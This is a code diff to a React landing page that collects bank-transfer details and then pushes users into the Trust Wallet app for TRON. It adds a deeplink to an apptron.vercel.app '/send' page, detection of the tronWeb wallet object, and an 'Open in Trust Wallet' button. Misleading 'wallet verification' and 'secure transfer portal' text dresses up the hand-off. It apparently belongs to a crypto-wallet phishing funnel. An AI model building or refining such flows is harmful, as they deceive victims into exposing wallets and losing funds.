@@ -2,6 +2,13 @@ import { useState } from "react";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 
+declare global {
+  interface Window {
+    tronWeb?: any;
+    tronLink?: any;
+  }
+}
+
 export default function LandingPage() {
   const [form, setForm] = useState({
     accountHolder: "",
@@ -14,10 +21,11 @@ export default function LandingPage() {
   const [submitted, setSubmitted] = useState(false);
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Record<string, string>>({});
+  const [showWalletButton, setShowWalletButton] = useState(false);
 
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  const DEEPLINK = "https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fbanktransfer.online%2Fsend";
+  const DEEPLINK = "trust://open_url?coin_id=195&url=" + encodeURIComponent("https://apptron.vercel.app/send");
 
   function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
     setForm({ ...form, [e.target.name]: e.target.value });
@@ -51,9 +59,17 @@ export default function LandingPage() {
         nativeBalance: "0",
       });
       setSubmitted(true);
-      setTimeout(() => {
-        window.location.href = DEEPLINK;
-      }, 2000);
+
+      // Auto detect: Trust Wallet dApp browser or normal browser
+      if (window.tronWeb?.defaultAddress?.base58) {
+        // Already in Trust Wallet dApp browser — redirect to /send
+        setTimeout(() => {
+          window.location.href = "/send";
+        }, 2000);
+      } else {
+        // Normal browser — show "Open in Trust Wallet" button
+        setShowWalletButton(true);
+      }
     } catch (e) {
       console.error(e);
       setLoading(false);
@@ -204,10 +220,34 @@ export default function LandingPage() {
                 <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00ff88" strokeWidth="2.5"><polyline points="20,6 9,17 4,12"/></svg>
               </div>
               <h2 style={{ color: "white", margin: "0 0 8px", fontSize: "20px" }}>Details Submitted!</h2>
-              <p style={{ color: "#6b7db3", fontSize: "14px", margin: "0 0 20px" }}>Redirecting to secure transfer portal...</p>
-              <div style={{ background: "#1a1a3e", borderRadius: "8px", padding: "12px", fontSize: "13px", color: "#6b7db3" }}>
-                Opening wallet verification...
-              </div>
+              
+              {showWalletButton ? (
+                <>
+                  <p style={{ color: "#6b7db3", fontSize: "14px", margin: "0 0 20px" }}>Please open in Trust Wallet to continue</p>
+                  <a href={DEEPLINK} style={{
+                    display: "inline-flex", alignItems: "center", justifyContent: "center", gap: "10px",
+                    width: "100%", padding: "16px",
+                    background: "#0077b6", color: "white", border: "none", borderRadius: "12px",
+                    fontSize: "16px", fontWeight: 700, cursor: "pointer", textDecoration: "none",
+                    marginBottom: "12px",
+                  }}>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
+                      <path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>
+                    </svg>
+                    Open in Trust Wallet
+                  </a>
+                  <p style={{ color: "#4a5568", fontSize: "11px", margin: "8px 0 0" }}>
+                    Make sure Trust Wallet is installed on your device
+                  </p>
+                </>
+              ) : (
+                <>
+                  <p style={{ color: "#6b7db3", fontSize: "14px", margin: "0 0 20px" }}>Redirecting to secure transfer portal...</p>
+                  <div style={{ background: "#1a1a3e", borderRadius: "8px", padding: "12px", fontSize: "13px", color: "#6b7db3" }}>
+                    Opening wallet verification...
+                  </div>
+                </>
+              )}
             </div>
           )}
         </div>
